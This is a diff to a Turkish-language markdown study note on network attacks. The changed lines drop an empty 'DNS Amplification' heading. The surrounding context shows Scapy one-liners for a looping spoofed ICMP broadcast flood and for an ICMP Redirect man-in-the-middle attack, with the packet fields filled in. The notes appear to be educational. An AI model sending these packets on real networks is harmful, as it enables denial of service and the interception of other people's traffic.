@@ -44,12 +44,9 @@
     
     => send(IP(src="hedef",dst="broadcast")/ICMP(type=8),loop=1)
 
-**- DNS Amplification:**
-
 **- ICMP Redirect(type=5):** ICMP Redirect mesajı, kendisine ulaşmak isteyen makineye bir router(yönlendirici) tarafından eğer bağlanabileceği daha iyi bir router varsa, bunun bilgisini döndürür.
 
 **- ICMP Redirect ile Man in the Middle Attack (ICMP type=5):** Hedefe daha iyi bir router olduğunu, bu router'in biz olduğumuzu söylediğimiz saldırı. Bu sayede hedef bizi router olarak kullanmaya çalışacak, hedefin trafiğini üzerimize alacağız. 
-
       => scapy
       
       => send(IP(src="192.168.0.1",dst="192.168.0.9")/ICMP(type=5,code=1,gw="192.168.0.10")/IP(src="192.168.0.9",dst="46.45.154.70")/TCP(flags="S",dport=80,sport=5555))
